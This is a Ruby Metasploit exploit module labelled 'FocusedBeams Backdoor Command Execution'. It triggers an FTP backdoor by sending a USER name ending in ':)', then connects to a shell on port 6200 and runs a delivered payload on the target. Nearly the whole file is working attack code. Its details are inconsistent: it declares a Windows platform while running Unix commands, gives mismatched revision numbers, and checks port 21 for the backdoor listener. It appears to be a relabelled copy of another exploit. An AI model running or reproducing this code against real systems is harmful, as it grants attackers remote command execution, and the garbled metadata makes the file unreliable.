# $Id: Focused_Beams.rb 13099 2011-07-05 05:20:47Z hdm $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;FocusedBeams Backdoor Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a malicious backdoor in FocusedBeams
            },
            &#039;Author&#039;         => [ &#039;Angel Injection&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 16979 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://1337day.com/exploits/16978&#039; ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;Platform&#039;       => [ &#039;win&#039; ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 3000,
                    &#039;BadChars&#039; => &#039;&#039;,
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
                            &#039;ConnectionType&#039; => &#039;find&#039;
                        }
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DisclosureDate&#039; => &#039;Sep 27 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options([ Opt::RPORT(21) ], self.class)
    end
 
    def exploit
 
        nsock = self.connect(false, {&#039;RPORT&#039; => 21}) rescue nil
        if nsock
            print_status("The port used by the backdoor bind listener is already open")
            handle_backdoor(nsock)
            return
        end
 
        # Connect to the FTP service port first
        connect
 
        banner = sock.get_once(-1, 30).to_s
        print_status("Banner: #{banner.strip}")
 
        sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
        resp = sock.get_once(-1, 30).to_s
        print_status("USER: #{resp.strip}")
 
        if resp =~ /^530 /
            print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
            disconnect
            return
        end
 
        if resp !~ /^331 /
            print_error("This server did not respond as expected: #{resp.strip}")
            disconnect
            return
        end
 
        sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")
 
        # Do not bother reading the response from password, just try the backdoor
        nsock = self.connect(false, {&#039;RPORT&#039; => 6200}) rescue nil
        if nsock
            print_good("Backdoor service has been spawned, handling...")
            handle_backdoor(nsock)
            return
        end
 
        disconnect
 
    end
 
    def handle_backdoor(s)
 
        s.put("id\n")
 
        r = s.get_once(-1, 5).to_s
        if r !~ /uid=/
            print_error("The service on port 21 does not appear to be a shell")
            disconnect(s)
            return
        end
 
        print_good("UID: #{r.strip}")
 
        s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
        handler(s)
    end
 
end 



